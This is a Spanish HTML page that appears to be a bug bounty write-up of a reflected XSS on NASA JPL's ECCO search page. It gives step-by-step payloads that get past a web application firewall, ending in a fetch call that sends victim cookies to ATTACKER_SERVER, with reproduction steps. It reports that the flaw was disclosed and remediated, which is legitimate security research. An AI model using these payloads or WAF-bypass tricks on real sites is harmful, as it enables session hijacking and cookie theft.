---
layout: default
---

<div class="container">
<article>
  <a href="../../../es/" class="back-btn">
    <svg viewBox="0 0 24 24"><polyline points="15 18 9 12 15 6"></polyline></svg>
    {{ site.title }}
  </a>
  <div class="lang-switcher">
    <a href="../../../en/bounties/nasa-jpl-ecco-xss-waf-bypass/" class="lang-btn">English (EN)</a>
    <a href="./" class="lang-btn active">EspaÃ±ol (ES)</a>
  </div>

  <div class="bounty-header">
    <h1>NASA JPL: ExfiltraciÃ³n de Cookies vÃ­a XSS</h1>
    <p>Bypass de Web Application Firewalls (WAF) para lograr el secuestro de sesiones en activos de NASA JPL ECCO.</p>
  </div>

  <div class="bounty-content">

    <h2>ðŸ” BÃºsqueda Inicial</h2>
    <p>Como en cualquier programa de bug bounty, lo primero fue usar la pÃ¡gina como un usuario normal. El campo de bÃºsqueda destacÃ³, asÃ­ que lo probamos:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn</code></p>
    <p>Nos dimos cuenta de que el valor introducido se reflejaba directamente en el sitio web.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal.png" alt="BÃºsqueda Normal">
    <p>Al inspeccionar el cÃ³digo fuente, vimos que nuestra entrada estaba dentro de una funciÃ³n JavaScript <code>console.log()</code>:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Normal%20Result.png" alt="Resultado BÃºsqueda Normal">
<pre><code>console.log('pwn');</code></pre>

    <h2>ðŸ›¡ï¸ Tag &lt;script&gt; Denegado</h2>
    <p>Realizamos pruebas bÃ¡sicas de XSS usando la etiqueta <code>&lt;script&gt;</code>:</p>
<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=&lt;script&gt;alert(1)&lt;/script&gt;</code></p>
    <p>El WAF rechazÃ³ nuestras solicitudes a la mÃ­nima seÃ±al de actividad maliciosa.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF bloqueando tag script">

    <h2>ðŸ—ï¸ Cerrando el String de console.log</h2>
    <p>Decidimos intentar cerrar la funciÃ³n <code>console.log()</code> para insertar cÃ³digo justo despuÃ©s. Usamos el payload: <code>pwn');</code></p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');</code></p>
    <p>Insertamos <code>')</code> justo despuÃ©s del texto, que es lo que JavaScript necesitaba para cerrar <code>console.log()</code>. Sin embargo, el punto y coma <code>;</code> no se mostraba en la salida.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Closing%20console.log.png" alt="Cerrando console.log">

    <h2>â“ ConcatenaciÃ³n de Javascript (No Funciona)</h2>
    <p>Intentamos aÃ±adir mÃ¡s cÃ³digo despuÃ©s del punto y coma:</p>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn');alert(1)</code></p>
    <p>Tras varias pruebas, no logramos que apareciera el punto y coma. Peor aÃºn, todo lo que iba detrÃ¡s desaparecÃ­a del texto.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Where%20is%20semicollon.png" alt="DÃ³nde estÃ¡ el punto y coma">

    <h2>âœ… ConcatenaciÃ³n de Javascript (Funcionando)</h2>
    <p>Para que funcionara, tuvimos que codificar el punto y coma en formato URL, cambiÃ¡ndolo de <code>;</code> a <code>%3b</code>.</p>
<pre><code># Codificar ; a %3b
pwn')%3balert(1)</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn')%3balert(1)</code></p>
    <p>A partir de ese momento, pudimos introducir cÃ³digo JavaScript para llevar a cabo el ataque.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Bypass%20Semicollon.png" alt="Bypass de punto y coma">

    <h2>ðŸš¨ Primer Alert (Funcionando)</h2>
    <p>Aunque el WAF no aceptaba el tag <code>&lt;script&gt;</code>, conseguimos que renderizara el tag de cierre <code>&lt;/script&gt;</code>.</p>
<pre><code>pwn')%3balert(1)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(1)%3C/script%3E%3b//</code></p>
    <p>Ese payload fue suficiente para realizar un <strong>XSS Reflejado</strong> exitoso. AsÃ­ se veÃ­a dentro del cÃ³digo:</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201%20HTML.png" alt="Alert 1 HTML">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Alert%201.png" alt="Alert 1">

    <h2>ðŸ›‘ Segundo Alert (Filtro del Firewall)</h2>
    <p>Una vez logrado ejecutar un <code>alert()</code>, quisimos ir mÃ¡s allÃ¡ y exfiltrar cookies.</p>
<pre><code>pwn')%3balert(document.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3balert(document.cookie)%3C/script%3E%3b//</code></p>
    <p>Probamos varios payloads, pero el WAF seguÃ­a rechazando nuestras solicitudes. En cuanto detectaba cadenas sospechosas como <code>document.cookie</code>, las bloqueaba.</p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Search%20Script%20Tag.png" alt="WAF bloqueando document.cookie">

    <h2>ðŸ”“ Tercer Alert (Bypass del Firewall)</h2>
    <p>Para lograr un bypass efectivo del WAF, creamos una variable <code>a</code> que contenÃ­a <code>document</code>, y solicitamos <code>cookie</code> desde esa variable.</p>
<pre><code>pwn')%3ba=document%3balert(a.cookie)&lt;/script&gt;;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3balert(a.cookie)%3C/script%3E%3b//</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Alert.png" alt="Alerta de Cookies con Bypass">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Result.png" alt="Resultado de Cookies">
<pre><code>pwn');    // Rompemos la lÃ³gica del sistema.
a=document;  // Creamos la variable a que contiene document.
alert(a.cookie); // Llamada al alert con cookies
&lt;/script&gt;;//  // Cerramos el &lt;script&gt; y comentamos el resto del cÃ³digo</code></pre>

    <h2>ðŸš€ Exploit Final (ExfiltraciÃ³n de Cookies)</h2>
    <p>Esta es la PoC final. En lugar de ejecutar <code>alert</code>, ejecuta directamente <code>fetch</code>, haciendo una peticiÃ³n a un servidor controlado por el atacante donde llegarÃ¡n las cookies de la vÃ­ctima.</p>
<pre><code>pwn');a=document;fetch('https://ATTACKER_SERVER/s='+a.cookie)&lt;/script&gt;//</code></pre>
    <p><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></p>
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration.png" alt="ExfiltraciÃ³n de Cookies">
    <img src="../../../assets/images/nasa-jpl-ecco-xss-waf-bypass/XSS%20Search%20-%20ecco.jpl.nasa.gov%20-%20Document%20Cookie%20Fetch%20Exfiltration%20Request.png" alt="PeticiÃ³n de ExfiltraciÃ³n">

    <h2>ðŸŽ¯ Pasos para Reproducir</h2>
    <ol>
      <li>Iniciar un servidor web pÃºblico (ej. usando <a href="https://serveo.net/" target="_blank">Serveo</a> exponiendo un servidor python local).</li>
      <li>Reemplazar <code>ATTACKER_SERVER</code> con la URL que Serveo genere.</li>
      <li>Visitar la URL:<br><code>https://ecco.jpl.nasa.gov/search.htm?search=pwn%27)%3ba=document%3bfetch(%27https://ATTACKER_SERVER/s=%27%2Ba.cookie)%3C/script%3E</code></li>
      <li>RecibirÃ¡s una peticiÃ³n con las cookies de la vÃ­ctima adjuntas.</li>
    </ol>

    <h2>ðŸŽ–ï¸ Reconocimiento y Premio</h2>
    <p>NASA JPL reconociÃ³ esta divulgaciÃ³n con una Carta de Reconocimiento oficial, confirmando el impacto y la remediaciÃ³n de la vulnerabilidad.</p>
    <div class="pdf-container">
      <iframe src="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf#toolbar=0" width="100%" height="100%" frameborder="0"></iframe>
    </div>
    <p style="text-align: center; margin-top: 20px;">
      <a href="../../../assets/others/nasa-jpl-ecco-xss-waf-bypass/Letter%20of%20Recognition%20-%20NASA%20Vulnerability%20Disclosure%20ConnorDev.pdf" class="lang-btn" target="_blank">ðŸ“¥ Descargar Carta Oficial (PDF)</a>
    </p>

    <h2>ðŸ¤ Detalle de ColaboraciÃ³n</h2>
    <p>Esta investigaciÃ³n fue realizada en una <strong>colaboraciÃ³n al 50%</strong> entre <strong>{{ site.researchers.ivan.name }}</strong> y <strong>{{ site.researchers.diego.name }}</strong>. Ambos contribuyeron equitativamente al descubrimiento, explotaciÃ³n y documentaciÃ³n de esta vulnerabilidad.</p>
  </div>
</article>
</div>

<div class="zoom-overlay" id="zoomOverlay" onclick="this.classList.remove('active')">
  <img id="zoomImg" src="" alt="Zoom">
</div>
<script>
document.querySelectorAll('.bounty-content img').forEach(img => {
  img.addEventListener('click', () => {
    document.getElementById('zoomImg').src = img.src;
    document.getElementById('zoomOverlay').classList.add('active');
  });
});
document.addEventListener('keydown', e => {
  if (e.key === 'Escape') document.getElementById('zoomOverlay').classList.remove('active');
});
</script>
